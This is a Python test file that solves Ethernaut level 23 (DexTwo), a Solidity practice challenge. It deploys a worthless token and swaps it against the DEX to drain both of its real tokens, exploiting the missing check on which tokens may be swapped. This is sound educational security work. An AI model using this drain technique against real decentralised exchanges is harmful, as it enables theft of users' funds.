from wake.testing import *
from tests.ethernaut_deployer import EthernautDeployer
from pytypes.contracts.lv23_dex_two import DexTwo, SwappableTokenTwo
from tests.lv22_dex_test import DexTransactionResolver

@default_chain.connect()
def test_lv23():
    ethernaut = EthernautDeployer(default_chain)
    contract = ethernaut.deploy_lv23()
    exploit_lv23(contract, ethernaut.attacker)
    ethernaut.check_lv23(contract)

def exploit_lv23(contract: DexTwo, attacker: Account):
    # Attack vector: inteeger division (rounding down in favor of the attacker) + unchecked token swap
    t1 = SwappableTokenTwo(contract.token1())
    t2 = SwappableTokenTwo(contract.token2())
    attack_token = SwappableTokenTwo.deploy(contract.address, "No value token :)", "SHT1", 1000)

    contract.approve(contract.address, 1000)
    attack_token.approve(attacker.address, contract.address, 1000)
    attack_token.transfer(contract.address, 100)

    resolver = DexTransactionResolver([t1, t2, attack_token], contract, attacker)
    resolver.print_balances()

    contract.swap(attack_token.address, t1.address, 100)
    resolver.print_swap(attack_token, t1, 100)

    contract.swap(attack_token.address, t2.address, 200)
    resolver.print_swap(attack_token, t2, 200)
